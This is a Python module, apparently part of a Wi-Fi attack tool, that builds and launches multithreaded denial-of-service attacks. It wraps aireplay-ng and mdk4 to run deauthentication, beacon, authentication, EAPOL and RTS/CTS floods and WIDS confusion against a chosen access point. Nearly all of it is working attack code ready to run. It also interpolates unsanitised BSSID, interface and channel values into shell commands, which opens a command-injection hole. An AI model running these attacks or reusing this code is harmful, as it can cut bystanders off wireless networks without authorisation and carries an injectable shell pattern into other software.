#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
attacks.py - Module implementing various Wi-Fi DoS attack strategies.

Features:
- Redirects stdout/stderr to DEVNULL to suppress mdk4 help/manual output.
- Supports dynamic parameters (pps, threads, power, duration), 
  where some may not be used in a specific attack, but the interface remains unified.
- To extend support for SDR, Evil Twin, etc., add corresponding subclasses of Attack.
"""

import os
import threading
import subprocess
import signal
import time

DEVNULL = subprocess.DEVNULL  # Shortcut for output redirection


class Attack:
    """
    Base class to describe a DoS attack strategy.
    Each subclass should override build_command(...) to generate the final command
    (e.g., using mdk4/aireplay-ng).
    """

    def __init__(self, name):
        self.name = name

    def build_command(self, **kwargs):
        """
        Should be overridden in the subclass.
        kwargs may include: pps_level, power_level, duration_level,
        bssid, interface, channel, etc.
        """
        raise NotImplementedError("Must override build_command in subclass")

    def run(self, pps_level=1, power_level=1, duration_level=1,
            threads_level=1, **kwargs):
        """
        Runs the attack in multiple threads (threads_level).
        
        :param pps_level: discrete pps level (1..N)
        :param power_level: (1..N), currently just a placeholder
        :param duration_level: (1..N) - not always used
        :param threads_level: number of parallel attack threads
        :param kwargs: additional parameters such as bssid, interface, channel, etc.
        """
        threads = []
        for i in range(threads_level):
            t = threading.Thread(
                target=self._run_single_thread,
                args=(i + 1, pps_level, power_level, duration_level),
                kwargs=kwargs
            )
            t.start()
            threads.append(t)
        return threads

    def _run_single_thread(self, instance_id, pps_level, power_level,
                           duration_level, **kwargs):
        cmd = self.build_command(
            pps_level=pps_level,
            power_level=power_level,
            duration_level=duration_level,
            **kwargs
        )
        print(f"[ATTACK] {self.name} (instance {instance_id}): {cmd}")
        try:
            subprocess.run(cmd, shell=True, preexec_fn=os.setsid,
                           stdout=DEVNULL, stderr=DEVNULL)
        except Exception as e:
            print(f"[ERROR] {self.name} failed cmd={cmd}\n{e}")

    def stop(self):
        """Base implementation does nothing."""
        pass


class DeauthFlood(Attack):
    """
    Deauth flood using aireplay-ng.
    Command: aireplay-ng --deauth 0 -a <bssid> <iface>
    """

    def __init__(self):
        super().__init__("DeauthFlood")

    def build_command(self, bssid="", interface="", **kwargs):
        return f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}"


class BeaconFlood(Attack):
    """
    Beacon flood using mdk4 in b-mode.
    Example: sudo mdk4 <iface> b -g -s <value>
    """

    def __init__(self):
        super().__init__("BeaconFlood")

    def build_command(self, interface="", pps_level=1, **kwargs):
        # Let the speed value = 100 * pps_level
        s_val = 100 * pps_level
        return f"sudo mdk4 {interface} b -g -s {s_val}"


class AuthDOS(Attack):
    """
    Auth DOS using mdk4 in a-mode.
    Command uses: -a <bssid> and -s <pps>
    """

    def __init__(self):
        super().__init__("AuthDOS")

    def build_command(self, bssid="", interface="", pps_level=1, **kwargs):
        s_val = 50 * pps_level
        return f"sudo mdk4 {interface} a -a {bssid} -s {s_val}"


class DeauthFloodMDK(Attack):
    """
    Deauth Flood using mdk4 in d-mode.
    Command uses: -B <bssid>, -c <channel>, and -s for random MAC.
    """

    def __init__(self):
        super().__init__("DeauthFloodMDK")

    def build_command(self, bssid="", channel="", interface="",
                      pps_level=1, **kwargs):
        # pps_level is implicit in this mode
        return f"sudo mdk4 {interface} d -B {bssid} -c {channel} -s"


class EAPOLStartFlood(Attack):
    """
    EAPOL Start flood using mdk4 in e-mode.
    Command uses: -t <bssid> and -s for flooding.
    """

    def __init__(self):
        super().__init__("EAPOLStartFlood")

    def build_command(self, bssid="", interface="", pps_level=1, **kwargs):
        s_val = 10 * pps_level
        return f"sudo mdk4 {interface} e -t {bssid} -s {s_val}"


class WIDSConfusion(Attack):
    """
    WIDS Confusion using mdk4 in w-mode.
    Command uses: -e <bssid>, -c <channel>, and -s.
    """

    def __init__(self):
        super().__init__("WIDSConfusion")

    def build_command(self, bssid="", channel="", interface="",
                      pps_level=1, **kwargs):
        s_val = 5 * pps_level
        return f"sudo mdk4 {interface} w -e {bssid} -c {channel} -s {s_val}"


class RTSCTSFlood(Attack):
    """
    RTS/CTS Flood using mdk4 in z-mode.
    """

    def __init__(self):
        super().__init__("RTSCTSFlood")

    def build_command(self, interface="", pps_level=1, **kwargs):
        # Command: mdk4 <iface> z
        return f"sudo mdk4 {interface} z"


def stop_all_attacks():
    """
    Stops all running attack processes by killing aireplay-ng and mdk4.
    """
    try:
        subprocess.run("sudo pkill -f 'aireplay-ng'", shell=True,
                       stdout=DEVNULL, stderr=DEVNULL)
        subprocess.run("sudo pkill -f 'mdk4'", shell=True,
                       stdout=DEVNULL, stderr=DEVNULL)
        print("[INFO] Stopped all known processes (aireplay-ng, mdk4).")
    except Exception as e:
        print(f"[ERROR] stop_all_attacks: {e}")
